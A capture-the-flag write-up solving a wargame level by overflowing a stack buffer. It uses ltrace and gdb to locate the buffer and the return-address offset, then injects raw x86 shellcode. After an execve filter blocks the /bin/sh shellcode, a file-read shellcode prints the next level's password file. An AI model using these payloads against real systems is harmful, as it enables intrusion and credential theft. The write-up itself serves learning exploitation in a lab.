# Level 04

## Initial Context

- One file: `level04`

## Solving the Challenge

The program expects a shell code.

By looking at the decompiled code, the process `fork()` and the child will `gets` for a shell code.

To get the address of the local buffer, we can use `ltrace` with `-f` to follow children.

```bash
$ ltrace -f ./level04 
...
[pid 3880] fork()                                   = 3881
[pid 3880] wait(0xffffd69c <unfinished ...>
[pid 3881] <... fork resumed> )                     = 0
...
[pid 3881] puts("Give me some shellcode, k")        = 26
[pid 3881] gets(-10592, 0, 0, 0, 2944a)             = -10592
```

`-10592` in hex is `0xffffd6a0` (or `a0 d6 ff ff` in LE). (thanks [cryptii.com](https://cryptii.com/pipes/integer-encoder))

We also need to find EIP offset, for that we can use `gdb` and a [`pattern generator`](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).

```bash
$ gdb ./level04 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
...
(gdb) set follow-fork-mode child
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /home/users/level04/level04
[New process 3895]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3895]
0x41326641 in ?? ()
(gdb) bt
#0  0x41326641 in ?? ()
#1  0x66413366 in ?? ()
...
(gdb)
```

Offset for `0x41326641` is `156`.

We can build a simple shell code payload:

```python
# shell code of 24 bytes
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# padding for a total of 156 bytes
+ "A" * 132

# local buffer address
+ "\xa0\xd6\xff\xff"
```

And use it:

```bash
$ python -c 'print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 132 + "\xa0\xd6\xff\xff"' | ./level04 
Give me some shellcode, k
no exec() for you
```

Since there is protection against the `execve()` syscall, we need to find another way to *print the password file*.

Using this [file read shell code](https://shell-storm.org/shellcode/files/shellcode-73.html), we can easily change it to read `/home/users/level05/.pass`.

Here is the payload:

```python
# shell code of 91 (include .pass path + null terminator) 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass\x00"

# padding for a total of 156 bytes
+ "A" * 65

# local buffer address
+ "\xa0\xd6\xff\xff"
```

Using it gives us the flag:

```bash
$ python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass\x00" + "A" * 65 + "\xa0\xd6\xff\xff"' | ./level04
Give me some shellcode, k
<flag>
child is exiting...
```
